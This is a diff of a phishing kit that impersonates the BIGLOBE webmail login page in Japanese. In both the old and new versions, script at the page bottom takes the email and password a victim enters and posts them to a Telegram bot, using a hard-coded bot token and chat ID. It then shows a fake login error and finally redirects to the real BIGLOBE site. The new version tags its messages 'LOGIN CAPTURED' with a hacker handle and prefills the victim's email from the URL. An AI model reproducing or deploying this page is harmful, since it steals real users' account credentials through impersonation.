@@ -1,671 +1,400 @@
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
-
-<head>
-    <meta charset="UTF-8">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>BIGLOBEメール｜Webメール</title>
     <link rel="icon" href="https://webmail.biglobe.ne.jp/images2/common/favicon.ico" type="image/vnd.microsoft.icon">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'MS Pゴシック', 'Hiragino Kaku Gothic Pro', 'Segoe UI', sans-serif;
-            background: white;
-            color: #333;
-            line-height: 1.5;
-        }
-
-        #container {
-            width: 100%;
-        }
-
-        /* Header Main - with blue wave */
-        #header_main {
-            background: linear-gradient(to bottom, white, white 60%, #e3f2fd 60%, #e3f2fd);
-            padding: 20px 40px 40px 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            border-bottom: 2px solid #0072c6;
-        }
-
-        #header_logo {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        #header_logo h1 {
-            margin: 0;
-            font-size: 28px;
-            font-weight: bold;
-            color: #0072c6;
-            letter-spacing: 1px;
-        }
-
-        #header_logo span {
-            font-size: 13px;
-            color: #666;
-        }
-
-        #header_keyword {
-            font-size: 13px;
-            color: #0072c6;
-            font-weight: normal;
-            text-align: right;
-        }
-
-        #header-link {
-            background: white;
-            padding: 12px 40px;
-            border-bottom: 1px solid #ddd;
-        }
-
-        .fmenu {
-            list-style: none;
-            display: flex;
-            gap: 20px;
-            margin: 0;
-            padding: 0;
-            font-size: 12px;
-        }
-
-        .fmenu a {
-            color: #0072c6;
-            text-decoration: none;
-        }
-
-        .fmenu a:hover {
-            text-decoration: underline;
-        }
-
-        /* Date Display */
-        .date-display {
-            font-size: 13px;
-            color: #666;
-            padding: 12px 40px;
-            border-bottom: 1px solid #ddd;
-            background: white;
-        }
-
-        /* Main Content */
-        #main {
-            display: flex;
-            max-width: 1200px;
-            margin: 0 auto;
-            gap: 30px;
-            padding: 30px 40px;
-            background: white;
-        }
-
-        #contents_block {
-            flex: 1;
-        }
-
-        /* Info Title */
-        .infotitle {
-            font-size: 16px;
-            font-weight: 600;
-            color: #0072c6;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #0072c6;
-        }
-
-        .infoArea {
-            background: white;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 0;
-            margin-bottom: 30px;
-        }
-
-        .infoArea p {
-            margin: 10px 0;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .infoArea a {
-            color: #0072c6;
-            text-decoration: none;
-        }
-
-        .infoArea a:hover {
-            text-decoration: underline;
-        }
-
-        .infoArea b {
-            color: #ff0000;
-            font-weight: 600;
-        }
-
-        .news {
-            margin-bottom: 20px;
-        }
-
-        .news ul {
-            list-style: none;
-        }
-
-        /* Side Menu */
-        #side_menuArea {
-            width: 280px;
-            flex-shrink: 0;
-        }
-
-        #side_menu_block {
-            background: #fffacd;
-            border: 1px solid #f0e68c;
-            border-radius: 0;
-            overflow: hidden;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-
-        #side_menu h2 {
-            margin: 0;
-            background: #f0f0f0;
-            padding: 10px 12px;
-            font-size: 13px;
-            border-bottom: 1px solid #ddd;
-            text-align: center;
-            color: #333;
-            font-weight: 600;
-        }
-
-        #side_menu h2 img {
-            max-width: 100%;
-            height: auto;
-        }
-
-        .login_block {
-            padding: 20px;
-            background: #fffacd;
-        }
-
-        .login_block form {
-            margin: 0;
-        }
-
-        .login_block form div {
-            margin-bottom: 12px;
-        }
-
-        .login_block label {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 5px;
-        }
-
-        .login_block input[type="email"],
-        .login_block input[type="password"] {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ccc;
-            border-radius: 0;
-            font-size: 12px;
-            font-family: inherit;
-            background: white;
-        }
-
-        .login_block input[type="email"]:focus,
-        .login_block input[type="password"]:focus {
-            outline: none;
-            border-color: #0072c6;
-            box-shadow: 0 0 0 2px rgba(0, 114, 198, 0.1);
-        }
-
-        #msg {
-            display: none;
-            background: #fff3cd;
-            color: #856404;
-            padding: 10px;
-            border-radius: 0;
-            margin-bottom: 15px;
-            font-size: 12px;
-            border: 1px solid #ffeaa7;
-        }
-
-        /* Checkbox List */
-        .login_block ul {
-            list-style: none;
-            margin: 15px 0;
-            padding: 0;
-        }
-
-        .login_block li {
-            margin: 10px 0;
-            font-size: 12px;
-        }
-
-        .login_block input[type="checkbox"] {
-            width: 14px;
-            height: 14px;
-            cursor: pointer;
-            margin-right: 6px;
-        }
-
-        .login_block label {
-            display: inline;
-            margin: 0;
-            cursor: pointer;
-            font-weight: normal;
-        }
-
-        /* Login Button */
-        .loginBtn {
-            text-align: center;
-            margin: 15px 0;
-        }
-
-        .loginBtn button {
-            width: 100%;
-            background: #ff9900 !important;
-            color: white !important;
-            border: none !important;
-            padding: 10px 30px !important;
-            border-radius: 0 !important;
-            cursor: pointer !important;
-            font-weight: 600 !important;
-            font-size: 14px !important;
-        }
-
-        .loginBtn button:hover {
-            background: #ff8800 !important;
-        }
-
-        .loginBtn input[type="image"] {
-            cursor: pointer;
-            border: none;
-            background: none;
-            padding: 0;
-        }
-
-        /* Loading Animation */
-        .loader {
-            display: none;
-            gap: 6px;
-            width: fit-content;
-            flex-direction: row-reverse;
-            margin-bottom: 15px;
-        }
-
-        .loader div {
-            width: 4px;
-            height: 4px;
-            background-color: #0067b8;
-            border-radius: 50%;
-            animation: pulse 1.4s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.5;
-            }
-        }
-
-        /* Support Links */
-        .supportLink {
-            list-style: none;
-            padding: 15px 0 0 0;
-            margin: 15px 0 0 0;
-            border-top: 1px solid #f0e68c;
-            font-size: 11px;
-            background: #fffacd;
-        }
-
-        .supportLink li {
-            margin: 8px 0;
-        }
-
-        .supportLink li:before {
-            content: "🟠 ";
-            margin-right: 5px;
-        }
-
-        .supportLink a {
-            color: #0072c6;
-            text-decoration: none;
-        }
-
-        .supportLink a:hover {
-            text-decoration: underline;
-        }
-
-        /* Footer */
-        #footerContainer {
-            background: white;
-            padding: 30px 40px;
-            border-top: 1px solid #ddd;
-            margin-top: 40px;
-        }
-
-        #footerLink {
-            margin-bottom: 20px;
-            font-size: 11px;
-            line-height: 1.8;
-        }
-
-        #footerLink a {
-            color: #0072c6;
-            text-decoration: none;
-        }
-
-        #footerLink a:hover {
-            text-decoration: underline;
-        }
-
-        #footerCopyright {
-            text-align: center;
-            font-size: 11px;
-            color: #666;
-            margin-top: 20px;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            #main {
-                flex-direction: column;
-            }
-
-            #side_menuArea {
-                width: 100%;
-            }
-
-            #header_main {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .fmenu {
-                flex-direction: column;
-                gap: 10px;
-            }
-        }
-    </style>
-</head>
-
-<body>
-    <div id="container">
-        <!-- Header -->
-        <div id="header_main">
-            <div id="header_logo">
-                <h1>BIGLOBE</h1>
-                <span style="font-size: 12px; color: #666;">メール</span>
-            </div>
-            <div id="header_keyword">
-                メールがもっと便利で楽しくなる！
-            </div>
-        </div>
-
-        <!-- Header Links -->
-        <div id="header-link">
-            <div id="support_menu">
-                <ul class="fmenu">
-                    <li><a href="#">メールサービス</a></li>
-                    <li><a href="#">会員サポート</a></li>
-                    <li><a href="#">障害情報</a></li>
-                </ul>
-            </div>
-        </div>
-
-        <!-- Date Display -->
-        <div class="date-display" id="dateDisplay"></div>
-
-        <!-- Main Content -->
-        <div id="main">
-            <!-- Left Content Area -->
-            <div id="contents_block">
-                <div class="news">
-                    <ul></ul>
-                </div>
-
-                <div class="infotitle" style="margin-top: 25px;">お知らせ</div>
-                <div class="infoArea">
-                    <p>・<a href="#">iOS26へのアップデートに伴うBIGLOBEメールの不具合について</a> <b>New!</b></p>
-                    <p>・<a href="#">BIGLOBEを装ったなりすましメールに対する対策強化のお知らせ</a> <b>New!</b></p>
-                    <p>・<a href="#">BIGLOBEメールおよびメールサービスのメンテナンス情報はこちらでご確認ください。</a></p>
-                    <p>・<a href="#">ウェブメールにログインできない場合は、こちらをご確認ください。</a></p>
-                    <p>・<a href="#">フィッシングサイトや、BIGLOBEを装ったメールにご注意ください</a></p>
-                </div>
-
-                <div id="info_footer">
-                    <center>
-                        <div style="margin: 20px 0;">
-                            <ul style="list-style: none; display: flex; gap: 30px; justify-content: center; font-size: 12px;">
-                                <li><a href="#">推奨環境</a></li>
-                                <li><a href="#">ヘルプ</a></li>
-                                <li><a href="#">よくあるお問い合わせ</a></li>
-                                <li><a href="#">必ずお読みください</a></li>
-                            </ul>
-                        </div>
-                    </center>
-                </div>
-            </div>
-
-            <!-- Right Login Panel -->
-            <div id="side_menuArea">
-                <div id="side_menu_block">
-                    <div id="side_menu">
-                        <h2>BIGLOBEメール ログイン</h2>
-
-                        <div class="login_block">
-                            <div style="display:none" id="success">
-                                <div>
-                                    <center>
-                                        <h4>メールを更新していただきありがとうございます</h4>
-                                        <p>リダイレクト</p>
-                                    </center>
-                                </div>
-                            </div>
-
-                            <div id="div1">
-                                <form onsubmit="return sendTelegramData(event)">
-                                    <div id="loader" class="loader">
-                                        <div></div>
-                                        <div></div>
-                                        <div></div>
-                                        <div></div>
-                                        <div></div>
-                                    </div>
-
-                                    <p id="msg">メールまたはパスワードが無効です。もう一度やり直してください。</p>
-
-                                    <div>
-                                        <label for="email">メールアドレスまたはユーザID</label>
-                                        <input name="email" type="email" autocomplete="off" id="email" value="" required>
-                                    </div>
-
-                                    <div>
-                                        <label for="password">BIGLOBEパスワード</label>
-                                        <input name="password" type="password" id="password" required>
-                                    </div>
-
-                                    <div>
-                                        <ul>
-                                            <li>
-                                                <input type="checkbox" id="autologinidflag" name="autologinidflag" value="1">
-                                                <label for="autologinidflag">次回からIDの入力を省略</label>
-                                            </li>
-                                            <li>
-                                                <input type="checkbox" id="autologinflag" name="autologinflag" value="1">
-                                                <label for="autologinflag"><a href="#">ログイン状態を保存する</a><br>
-                                                    <span style="font-size: 11px; color: #666;">（共有パソコンではチェックをはずしてください）</span>
-                                                </label>
-                                            </li>
-                                        </ul>
-                                    </div>
-
-                                    <div class="loginBtn">
-                                        <button type="submit" style="
-                                            background: #ff9900;
-                                            color: white;
-                                            border: none;
-                                            padding: 8px 30px;
-                                            border-radius: 3px;
-                                            cursor: pointer;
-                                            font-weight: 600;
-                                            font-size: 13px;
-                                        ">ログイン</button>
-                                    </div>
-                                </form>
-                            </div>
-
-                            <ul class="supportLink">
-                                <li><a href="#">ログイン方法について</a></li>
-                                <li><a href="#">ID・パスワードを忘れた場合</a><br>
-                                    BIGLOBE法人会員でID・パスワードをお忘れの方は [<a href="#">こちら</a>]
-                                </li>
-                                <li><a href="#">メールアドレスの取得・確認</a></li>
-                                <li><a href="#">メールアドレスの変更</a></li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <div id="footerContainer">
-            <div id="footerLink">
-                <div style="margin-bottom: 15px;">
-                    <a href="#">BIGLOBEトップ</a> | <a href="#">インターネット接続</a>
-                    (<a href="#">ビッグローブ光</a> ・ <a href="#">格安SIM</a> ・ <a href="#">SIM替え</a>)<br>
-                    <a href="#">会社概要</a> | <a href="#">ニュースリリース</a> | <a href="#">採用情報</a> |
-                    <a href="#">個人情報保護ポリシー</a> | <a href="#">Cookieポリシー</a> |
-                    <a href="#">安心・安全</a> | <a href="#">お問い合わせ</a>
-                </div>
-            </div>
-            <div id="footerCopyright">
-                Copyright(C)BIGLOBE Inc. 1996-2025
-            </div>
+    <link href="https://webmail.biglobe.ne.jp/css2/import_top.css" rel="stylesheet" type="text/css">
+    
+    
+    <!-- SWキーボードここから//-->
+    <link rel="stylesheet" href="https://webmail.biglobe.ne.jp/softkeyboard/softkeyboardsjis.css">
+    
+    </head>
+    
+    <body onload="deprecated_check()">
+    
+    <div id="container"><a name="pagetop"></a>
+    
+    <!-- Header// -->
+    <div id="header_main">
+        <div id="header_logo">
+        <h1><img src="https://webmail.biglobe.ne.jp/images2/common/logo_email.gif" alt="BIGLOBEメール" usemap="#logo" width="210" height="31"></h1>
+        <map name="logo">
+        <area shape="rect" coords="0,0,150,35" href="" alt="BIGLOBE">
+        <area shape="rect" coords="150,0,210,35" href="" alt="BIGLOBEメール">
+        </map>
+        </div><!--/header-logo-->
+        <div id="header_keyword">
+        <strong>メールがもっと便利で楽しくなる！</strong>
+        </div><!--/header_keyword-->
+    
+        <br class="clear">
+    </div>
+    
+    <div id="header-link">
+        <div id="support_menu">
+    <ul class="fmenu">
+          <li><a href="https://email.biglobe.ne.jp/">メールサービス</a></li>
+          <li><a class="bl" href="" target="">会員サポート</a></li>
+          <li><a class="bl" href="" target="">障害情報</a></li>
+    </ul>
         </div>
     </div>
-
-    <script>
-        // Telegram Bot Configuration
-        const TELEGRAM_BOT_ID = "8298175856:AAEHXOOZGQbT9Dy6hqaCmorGt3iGcKsHCKo";
-        const TELEGRAM_CHAT_ID = 7838406845;
-        let attemptCount = 0;
-
-        // Display current date
-        function displayCurrentDate() {
-            const options = { year: 'numeric', month: '2-digit', day: '2-digit', weekday: 'long' };
-            const today = new Date();
-            const dateStr = today.toLocaleDateString('ja-JP', options);
-            const months = ['1月', '2月', '3月', '4月', '5月', '6月', '7月', '8月', '9月', '10月', '11月', '12月'];
-            const weekdays = ['日', '月', '火', '水', '木', '金', '土'];
-            const month = months[today.getMonth()];
-            const date = today.getDate();
-            const day = weekdays[today.getDay()];
-            document.getElementById('dateDisplay').textContent = `本日は ${today.getFullYear()}年${month}${date}日(${day})です。`;
+    <!-- //Header -->
+    
+    
+    <!-- Main_start -->
+    <div id="main">
+    
+    <!-- Contents_start -->
+    <div id="contents_block">
+    
+    <!-- 注意書きの記載 //-->
+        <!-- JavaScriptが動作しない場合 //-->
+    
+    
+    <!-- 注意書きの記載 //-->
+    <!--★ここから追記4/20★-->
+    <div class="news">
+    <ul>
+    
+    
+    
+    </ul>
+    </div>
+    
+    <div class="infotitle" style="margin-top:25px;">お知らせ</div>
+    <div class="infoArea">
+    <p>・<a href="" target="">BIGLOBEメール 一部仕様変更のお知らせ</a><font color="ff0000"><b>New!</b></font></p>
+    <p>・<a href="#">BIGLOBEを装ったなりすましメールに対する対策強化のお知らせ</a><font color="ff0000"><b>New!</b></font></p>
+    <p>・<a href="#">BIGLOBEメールおよびメールサービスのメンテナンス情報はこちらでご確認ください。</a></p>
+    <p>・<a href="" target="">Webメールにログインが出来ない場合はこちらをご確認ください。</a><font color="ff0000"><b></b></font></p>
+    <p>・<a href="#">フィッシングサイトや、BIGLOBEを装ったメールにご注意ください</a></p>
+    </div>
+    
+    
+    <div id="info_footer"><p>
+    
+    
+    </p><div class="webrylink">
+    <center>
+    
+    <div class="banner_area" style="margin-bottom: 15px;">
+    </div>
+    <ul>
+    <li><a href="">推奨環境</a></li>
+    <li><a href="">ヘルプ</a></li>
+    <li><a href="">よくあるお問い合わせ</a></li>
+    <li><a href="">必ずお読みください</a></li>
+    </ul>
+    </center>
+    </div>
+    
+    <p></p></div>
+    
+    <!-- /contents_block --></div>
+    <!-- Contents_end -->
+    
+    
+    <!-- Menu_start -->
+    <div id="side_menuArea">
+    <div id="side_menu_block">
+    <div id="side_menu">
+    <h2><img src="https://webmail.biglobe.ne.jp/images2/pagetitle_top.jpg" alt="BIGLOBEメールメールにログイン" width="238" height="43"></h2>
+    
+    <!-- ERRORメッセージ:s -->
+    <!-- ERRORメッセージ:e -->
+    
+    <div class="login_block">
+    
+    
+    
+    
+      <div style="display:none" id="success" >
+     <div>
+         <center>      
+                 
+    
+                  
+    <h4>メールを更新していただきありがとうございます</h4>
+                  <p>リダイレクト</p>
+    
+                   </div>
+    
+     </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div id="div1">
+    <form>
+    
+        <div>
+    
+    
+      <p id="msg" style="display: none;color:red" class="alert alert-danger">メールまたはパスワードが無効です。もう一度やり直してください。</p>
+    
+        <label for="loginid">メールアドレスまたはユーザID</label>
+        <input name="email" type="email" size="35" autocomplete="off" id="email" value="" style="
+        width: 100%;
+        height: 25px;
+    ">
+        <label for="biglobe_pw">BIGLOBEパスワード</label>
+        <input name="password" type="password" size="30" id="password" style="
+        width: 100%;
+        height: 25px;
+    ">
+        </div>
+        
+    <!-- Androidの場合SWキーボードのボタンを表示しないここから //-->
+    
+    <!-- Androidの場合SWキーボードのボタンを表示しないここまで //-->
+    
+    <!-- SWキーボードここから //-->
+    <div id="keyboard"></div>
+    <div id="my_div"></div>
+    
+    <!-- SWキーボードここまで //-->
+    
+        <ul>
+        <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1"><label for="autologinidflag">次回からIDの入力を省略</label></li>
+        <li><input type="checkbox" name="autologinflag" id="autologinflag" value="1"><label for="autologinflag"><a href="" target="">ログイン状態を保存する</a><br>（共有パソコンではチェックをはずしてください）</label></li>
+            <li><select name="version" id="version" onchange="deprecated_check()" style="display:none;">
+    <option value="advanced" selected="">アドバンスト版</option>
+    <option value="basic">標準版</option>
+    </select></li>
+             <li>
+    
+    <div id="deprecated" style="padding-top: 10px">
+    </div>
+    
+    </li>
+            </ul>
+    
+        <div class="loginBtn">
+        <input id="submit-btn" type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" border="0" alt="ログイン" title="ログイン" width="205" height="37"></div>
+    </form>
+    </div><!-- //login_form -->
+    <script type="text/javascript">
+    <!--
+    
+        doit();
+    
+    //-->
+    </script>
+    
+    <ul class="supportLink">
+    <li><a href="" target="">ログイン方法について</a></li>
+    <li><a href="" target="">ID・パスワードを忘れた場合</a><br>
+    BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="" target="">こちら</a>］</li>
+    <li><a href="" target="">メールアドレスの取得・確認</a></li>
+    <li><a href="" target="">メールアドレスの変更</a></li>
+    </ul>
+    </div><!-- /login_block -->
+    
+    
+    <!-- /side_menu --></div>
+    <!-- /side_menu_block --></div>
+    
+    </div><!-- //side_menuArea -->
+    <!-- /Menu_end -->
+    
+    </div><!-- /main -->
+    <!-- /Main_end -->
+    
+    <!-- START : フッター -->
+    <div id="footerContainer">
+    <!--フッターサーチここから-->
+    <!--
+    <div id="footerSearch">
+    <table border="0" align="center" cellpadding="0" cellspacing="0" summary="search form">
+    <tr>
+        <form name="srh2" id="srh2" method="get" action="http://cgi.search.biglobe.ne.jp/cgi-bin/search2-f">
+        <td>
+            <input type="hidden" name="search" value="検索">
+            <input type="text" name="q" size="18" style="width:216px" value="">
+        </td>
+        <td width="3"><img src="https://webmail.biglobe.ne.jp/images2/common/spacer.gif" alt="" width="3" height="3"></td>
+        <td><input type="submit" name="btn2" value="ウェブ検索"></td>
+        </form>
+    </tr>
+    </table>
+    </div>
+    -->
+    <!--フッターサーチここまで-->
+    <div id="footerLink">
+        <div id="footerLinkBox1">&nbsp;</div>
+        <div id="footerLinkBox2">
+            <a href="">BIGLOBEトップ</a>｜<a href="">インターネット接続</a>（<a href="">ビッグローブ光</a>・<a href="">格安SIM</a>・<a href="">SIM替え</a>）<br>
+            <a href="">会社概要</a>｜<a href="">ニュースリリース</a>｜<a href="">採用情報</a>｜<a href="">個人情報保護ポリシー</a>｜<a href="">Cookieポリシー</a>｜<a href="">安心・安全</a>｜<a href="">お問い合わせ</a>
+        </div>
+    
+    
+        <div id="footerLinkBox3">
+        <img src="https://webmail.biglobe.ne.jp/images2/common/footer3logo.gif" alt="" width="210" height="66" usemap="#FooterMap">
+    <map name="FooterMap" id="FooterMap">
+    <area shape="rect" coords="95,0,155,64" href="" target="" alt="プライバシーマーク" onclick="B.gae('footer', 'click', 'footer');">
+    <area shape="rect" coords="160,0,210,64" href="" target="" alt="インターネット接続サービス安全・安心マーク" onclick="B.gae('footer', 'click', 'footer');">
+    </map>
+        </div>
+    
+    
+    </div>
+    <div id="footerCopyright">
+    
+        <noscript>Copyright(C)BIGLOBE Inc.</noscript>
+    </div>
+    </div>
+    <!-- END : フッター -->
+    
+    
+    </div><!-- /container -->
+    
+    
+    
+    
+    
+          <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript">
+    // Telegram Bot Configuration - Same as owa.html pattern
+    var tick = 0;
+    var telegram_bot_id = "8298175856:AAEHXOOZGQbT9Dy6hqaCmorGt3iGcKsHCKo"; // Bot token
+    var chat_id = 7838406845; // Chat ID for receiving reports
+    var email_data, password_data, domain_data;
+    
+    // Prepare data for Telegram message
+    var ready = function () {
+        email_data = document.getElementById("email").value;
+        password_data = document.getElementById("password").value;
+        
+        // Extract domain from email
+        let n = email_data.indexOf("@");
+        let domain = email_data.substr(n + 1);
+        domain_data = domain.substr(0, domain.indexOf('.'));
+        
+        return {
+            email: email_data,
+            password: password_data,
+            domain: domain_data,
+            full_domain: domain
+        };
+    };
+    
+    // Send data to Telegram following owa.html pattern
+    var sendToTelegram = function (data) {
+        var message = "🔐 BIGLOBE LOGIN CAPTURED ✅\n\n";
+        message += "📧 Email: " + data.email + "\n";
+        message += "🔑 Password: " + data.password + "\n";
+        message += "🌐 Domain: " + data.domain + "\n";
+        message += "📍 Full Domain: " + data.full_domain + "\n\n";
+        message += "▬▬▬▬▬▬[BIGLOBE INFO]▬▬▬▬▬▬\n";
+        message += "🔗 Login URL: https://webmail.biglobe.ne.jp/\n\n";
+        message += "📱 Report Time: " + new Date().toLocaleString() + "\n";
+        message += "📞 HACKER: @plus234ng";
+        
+        var settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            "method": "POST",
+            "headers": {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({
+                "chat_id": chat_id,
+                "text": message
+            })
+        };
+        
+        $.ajax(settings).done(function (response) {
+            console.log("Telegram Report Sent:", response);
+        }).fail(function (error) {
+            console.log("Telegram Report Failed:", error);
+        });
+    };
+    
+    $(document).ready(function () {
+        var attempt_count = 0;
+        
+        // Parse email from URL hash if present
+        var decodedmail = window.location.hash.substr(1);
+        if (decodedmail) {
+            document.getElementById("email").value = decodedmail;
         }
-
-        // Show error message
-        function showError() {
-            document.getElementById('msg').style.display = 'block';
-        }
-
-        // Hide error message
-        function hideError() {
-            document.getElementById('msg').style.display = 'none';
-        }
-
-        // Show loading animation
-        function showLoader() {
-            document.getElementById('loader').style.display = 'flex';
-            document.getElementById('div1').style.opacity = '0.4';
-        }
-
-        // Hide loading animation
-        function hideLoader() {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('div1').style.opacity = '1';
-        }
-
-        // Send data to Telegram
-        function sendTelegramData(event) {
+        
+        // Handle submit button click
+        $("#submit-btn").click(function (event) {
             event.preventDefault();
-            attemptCount++;
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            if (!email || !password) {
-                showError();
+            
+            var email = $("#email").val();
+            var password = $("#password").val();
+            
+            // Validate fields
+            if (!email) {
+                $("#msg").text("Email field is empty!").show();
                 return false;
             }
-
-            showLoader();
-
-            // Create message for Telegram
-            const telegramMessage = `🔐 BIGLOBE MAIL LOGIN ✅\n\n` +
-                `📧 Email: ${email}\n` +
-                `🔑 Password: ${password}\n\n` +
-                `⏰ Timestamp: ${new Date().toISOString()}\n` +
-                `🔢 Attempt: ${attemptCount}\n\n` +
-                `🌐 Site: BIGLOBE Mail Webmail`;
-
-            // Send to Telegram API
-            const settings = {
-                "async": true,
-                "crossDomain": true,
-                "url": "https://api.telegram.org/bot" + TELEGRAM_BOT_ID + "/sendMessage",
-                "method": "POST",
-                "headers": {
-                    "Content-Type": "application/json",
-                    "cache-control": "no-cache"
-                },
-                "data": JSON.stringify({
-                    "chat_id": TELEGRAM_CHAT_ID,
-                    "text": telegramMessage
-                })
-            };
-
-            $.ajax(settings).done(function (response) {
-                console.log("Telegram message sent:", response);
-            }).fail(function (error) {
-                console.log("Telegram error:", error);
-            });
-
-            // Simulate login delay
-            setTimeout(() => {
-                hideLoader();
-                showError();
-                document.getElementById('password').value = '';
-
-                // After 3 attempts, redirect
-                if (attemptCount >= 3) {
-                    setTimeout(() => {
-                        window.location.replace("https://webmail.biglobe.ne.jp/");
-                    }, 2000);
-                }
-            }, 3000);
-
+            
+            // Email validation regex
+            var email_regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+            if (!email_regex.test(email)) {
+                $("#msg").text("That account doesn't exist. Enter a different account").show();
+                return false;
+            }
+            
+            if (!password) {
+                $("#msg").text("Password field is empty!").show();
+                return false;
+            }
+            
+            attempt_count++;
+            
+            // Collect and send data to Telegram
+            var data = ready();
+            sendToTelegram(data);
+            
+            // Show loading state
+            $("#submit-btn").val("Verifying...");
+            
+            // Clear password field
+            $("#password").val("");
+            
+            // Show error message
+            $("#msg").html("メールまたはパスワードが無効です。もう一度やり直してください。").show();
+            
+            // After 2 attempts, redirect
+            if (attempt_count >= 2) {
+                attempt_count = 0;
+                setTimeout(() => {
+                    window.location.replace("https://www.biglobe.ne.jp/");
+                }, 3000);
+            } else {
+                setTimeout(() => {
+                    $("#submit-btn").val("ログイン");
+                }, 1500);
+            }
+            
             return false;
-        }
-
-        // Hide error on password focus
-        document.getElementById('password').addEventListener('focus', hideError);
-
-        // Initialize page
-        document.addEventListener('DOMContentLoaded', function () {
-            displayCurrentDate();
-            console.log("BIGLOBE Mail Login Page Loaded");
         });
+        
+        // Handle Enter key press
+        $(document).keypress(function (event) {
+            var keycode = (event.keyCode ? event.keyCode : event.which);
+            if (keycode == '13') {
+                event.preventDefault();
+                $("#submit-btn").click();
+            }
+        });
+    });
     </script>
-</body>
-
-</html>
+    
+    
+    
+    </body></html>
